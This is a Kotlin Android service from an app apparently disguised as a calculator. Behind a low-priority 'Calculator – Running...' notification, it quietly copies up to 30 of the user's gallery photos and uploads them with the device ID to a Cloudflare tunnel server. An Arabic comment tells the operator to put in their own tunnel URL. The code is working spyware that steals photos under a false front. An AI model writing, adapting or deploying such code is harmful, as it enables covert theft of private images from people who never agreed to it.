package com.lab.calculator

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class UploadService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // ⚠️ غيّر الـ URL ده للـ Cloudflare Tunnel بتاعك
    private val serverUrl = "https://supplemental-ended-she-jet.trycloudflare.com"

    private val CHANNEL_ID = "calc_service_channel"
    private val NOTIFICATION_ID = 1001

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Calculator")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        scope.launch {
            try {
                syncImages()
            } catch (e: Exception) {
                Log.e("UPLOAD", "خطأ في المزامنة", e)
            }
        }

        return START_STICKY
    }

    private suspend fun syncImages() {
        val images = MediaFetcher.getAllImages(applicationContext)
        Log.d("SYNC", "بدء رفع ${images.size} صورة")

        var uploaded = 0
        for (image in images.take(30)) {
            val tempFile = File(cacheDir, image.name)
            if (MediaFetcher.copyToFile(applicationContext, image.uri, tempFile)) {
                if (uploadImage(tempFile, image.name)) {
                    uploaded++
                }
            }
            tempFile.delete()
        }

        Log.d("SYNC", "✅ تم رفع $uploaded من ${images.size}")
    }

    private suspend fun uploadImage(file: File, originalName: String): Boolean {
        return withContext(Dispatchers.IO) {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Build.ID)
                .addFormDataPart("type", "images")
                .addFormDataPart(
                    "file", originalName,
                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url("$serverUrl/upload")
                .post(body)
                .build()

            try {
                client.newCall(request).execute().use { response ->
                    Log.d("UPLOAD", "$originalName → ${response.code}")
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e("UPLOAD", "فشل رفع $originalName", e)
                false
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Calculator Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}